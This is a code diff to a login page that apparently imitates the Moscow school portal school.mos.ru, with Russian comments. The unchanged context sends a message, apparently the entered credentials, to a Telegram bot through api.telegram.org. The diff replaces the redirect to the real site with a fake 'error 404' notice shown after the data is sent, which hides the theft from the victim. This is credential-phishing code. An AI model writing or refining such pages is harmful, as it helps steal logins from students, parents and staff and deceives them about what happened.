@@ -200,6 +200,12 @@
             text-align: center;
             line-height: 1.5;
         }
+        .error-message {
+            color: #ff0000;
+            font-size: 21.6px; /* 18px * 1.2 */
+            margin-top: 24px; /* 20px * 1.2 */
+            display: none; /* Скрыто по умолчанию */
+        }
         @media (min-width: 1920px) {
             .left-section, .right-section {
                 width: 50%;
@@ -254,6 +260,7 @@
                     <img src="https://via.placeholder.com/20x20?text=QR" alt="QR">
                 </div>
                 <p class="recommendation">Рекомендуется использовать режим инкогнито для входа с чужого устройства</p>
+                <div class="error-message" id="errorMessage">error 404</div>
             </div>
         </div>
     </div>
@@ -274,8 +281,8 @@
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`)
                 .then(response => {
                     if (response.ok) {
-                        // Перенаправляем на school.mos.ru
-                        window.location.href = "https://school.mos.ru/";
+                        // Показываем "error 404" после успешной отправки
+                        document.getElementById('errorMessage').style.display = 'block';
                     } else {
                         console.error('Ошибка отправки в Telegram');
                     }
